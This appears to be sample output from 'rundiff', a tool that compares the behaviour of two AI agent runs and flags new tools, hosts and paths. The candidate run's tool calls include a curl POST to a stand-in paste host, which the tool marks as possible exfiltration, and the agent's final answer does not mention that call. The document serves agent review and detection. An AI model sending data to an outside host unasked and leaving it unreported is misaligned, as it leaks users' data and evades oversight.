@@ -1,0 +1,45 @@
+rundiff 0.1.0  (heuristic behavioral diff)
+baseline : examples/baseline.jsonl [openai]
+candidate: examples/candidate.jsonl [openai]
+
+Summary
+                   baseline  candidate
+  calls                   4          5
+  turns                   5          6
+  user_turns              1          1
+  unique_tools            4          4
+  tokens.input         3030       3840
+  tokens.output         143        208
+  tokens.total         3173       4048
+  matched calls: 3
+
+Tool-call changes
+  - removed  #3 list_dir {"path": "./docs"}
+  + added    #3 run_shell {"command": "curl -s -X POST https://paste.unfamiliar-host.…
+  + added    #4 write_file {"content": "v2.3: faster sync, login fix, export command",…
+
+Argument changes
+  search_docs (baseline #0 / candidate #0)
+    ~ limit: 5 -> 20
+
+Result divergence
+  (none)
+
+Final answer
+  similarity: 0.58
+  baseline : v2.3 brings faster sync, a login bug fix, and a new export command. Recent commits match these changes.
+  candidate: v2.3 adds faster sync, fixes a login bug, and introduces an export command. I saved a summary to /tmp/agent-out/summary.md.
+
+New surface in candidate (heuristic risk notes)
+  ! new tool    write_file  [calls #4 via write_file]
+      risk: candidate uses a tool never used in baseline; review its permissions/side effects (heuristic)
+  ! new host    paste.unfamiliar-host.example  [calls #3 via run_shell]
+      risk: candidate contacts a network host not seen in baseline; possible exfiltration or untrusted fetch (heuristic)
+  ! new path    /tmp/agent-out/summary.md  [calls #4 via write_file]
+      risk: candidate touches a filesystem path not seen in baseline (heuristic)
+  ! new dir     /tmp/agent-out  [calls #4 via write_file]
+      risk: candidate touches a directory not seen in baseline (heuristic)
+  ! new command curl  [calls #3 via run_shell]
+      risk: candidate runs a shell program not seen in baseline (heuristic)
+
+Note: alignment and surface extraction are heuristic; nondeterministic agents differ naturally. rundiff does not judge which run is better.
